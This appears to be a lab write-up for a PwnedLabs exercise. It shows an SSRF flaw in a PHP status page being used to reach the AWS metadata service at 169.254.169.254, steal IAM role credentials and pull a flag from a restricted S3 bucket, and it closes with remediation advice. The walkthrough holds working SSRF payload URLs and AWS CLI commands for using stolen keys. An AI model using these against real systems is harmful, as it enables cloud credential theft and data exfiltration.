## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/ssrf-to-pwned

---
## Vulnerability Summary
The environment is vulnerable to **Server-Side Request Forgery (SSRF)**, which allows an attacker to interact with the internal AWS Instance Metadata Service (IMDS).

1. **SSRF Vulnerability**: The `status.php` file failed to validate the `name` parameter, allowing an attacker to coerce the server into making arbitrary HTTP requests to internal IP addresses.
2. **Metadata Service Access**: By targeting the link-local address `169.254.169.254`, the attacker successfully queried the IMDS to retrieve sensitive instance metadata.
3. **IAM Credential Theft**: The attacker enumerated the security credentials for the assigned IAM role (`MetapwnedS3Access`), obtaining temporary AWS Access Keys, Secret Keys, and a Session Token.
4. **Privilege Escalation & Impact**: With the stolen credentials, the attacker gained authorized access to restricted S3 buckets, bypassing standard bucket policies to exfiltrate confidential files and flags.

---
## Walkthrough
`http://app.huge-logistics.com`

Inspect the source code to find the bucket `huge-logistics-storage`. List files in the bucket:

```bash
aws s3 ls huge-logistics-storage --no-sign-request
	backup/
	web/
aws s3 ls huge-logistics-storage/backup/ --no-sign-request
	cc-export2.txt
	flag.txt
```

Cannot access the files. Enumerate the website further to find `status/statis.php` which takes the following parameter:
	`?name=hugelogisticsstatus.com`
We can replace this existing parameter URL with the following URL using the internal link-local UP address `169.254.169.254` that hosts the metadata service:

```http
http://app.huge-logistics.com/status/status.php?name=169.254.169.254/latest/meta-data/iam/info
	IAM role
```

This reveals an IAM role configured and named `MetapwnedS3Access`. Enumerate the credentials for this role with:

```http
http://app.huge-logistics.com/status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
	AWS Keys
```

Configure AWS with the keys for `MetapwnedS3Access`:

```bash
aws configure --profile meta
aws configure set aws_session_token '<SESSION_TOKEN>' --profile meta
aws sts get-caller-identity --profile meta
```

Now we can try the `huge-logistics-storage/backup/` bucket again... Success!:

```bash
aws s3 cp s3://huge-logistics-storage/backup/flag.txt . --profile meta
```

---
## Remediations
1. **SSRF Prevention**:
   - Implement strict allow-lists for all user-supplied URLs. Never allow the application to make outbound requests to arbitrary IP addresses or user-controlled domains.
   - Use a robust library to validate and sanitize URLs, ensuring that internal IP ranges (like `169.254.169.254`) are explicitly blocked.

2. **IMDS Hardening**:
   - Enforce the use of **IMDSv2**, which requires a session-oriented `PUT` request and mitigates many SSRF-based attacks by requiring a token to be fetched before accessing metadata.
   - Set the `HttpTokens` requirement to `required` on all EC2 instances to disable IMDSv1 entirely.

3. **Least Privilege (IAM)**:
   - Apply the **Principle of Least Privilege (PoLP)** to IAM roles assigned to EC2 instances. If an instance does not require access to specific S3 buckets, ensure the IAM policy reflects this.
   - Use `IAM Policy` conditions to restrict access based on VPC ID or source IP if possible.

4. **Monitoring & Governance**:
   - Monitor `CloudTrail` logs for unusual API calls (e.g., `AssumeRole` or S3 operations) originating from instance-bound credentials.
   - Utilize `Amazon GuardDuty` to detect potentially malicious activity related to SSRF and unauthorized metadata access.